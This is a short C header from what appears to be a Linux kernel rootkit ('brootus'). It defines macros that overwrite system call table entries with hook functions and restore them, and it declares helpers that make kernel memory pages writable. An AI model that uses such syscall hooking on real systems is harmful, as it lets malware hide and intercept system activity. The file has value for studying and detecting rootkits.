#ifndef SYSCALL_H
#define SYSCALL_H

#include "kernel_variables.h"
#include "sysmap.h"

#define HOOK_SYSCALL(NAME) original_##NAME = get_syscall_table_addr()[__NR_##NAME]; \
													 get_syscall_table_addr()[__NR_##NAME] = brootus_##NAME

#define RESTORE_SYSCALL(NAME) get_syscall_table_addr()[__NR_##NAME] = original_##NAME

/*
 * Functions
 */

extern int set_addr_rw(unsigned long addr);
extern void set_pte_permissions(unsigned long addr, int perm);
extern void syscall_table_modify_begin(void);
extern void syscall_table_modify_end(void);

#endif
